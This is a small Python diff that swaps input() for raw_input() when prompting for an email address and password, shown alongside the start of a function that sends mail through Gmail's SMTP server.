@@ -3,8 +3,8 @@ import subprocess
 import smtplib
 import re
 
-email = input("[+] Enter your email >> ")
-password = input("[+] Enter your password >> ")
+email = raw_input("[+] Enter your email >> ")
+password = raw_input("[+] Enter your password >> ")
 
 def send_mail(email, password, message):
 	server = smtplib.SMTP("smtp.gmail.com", 587)
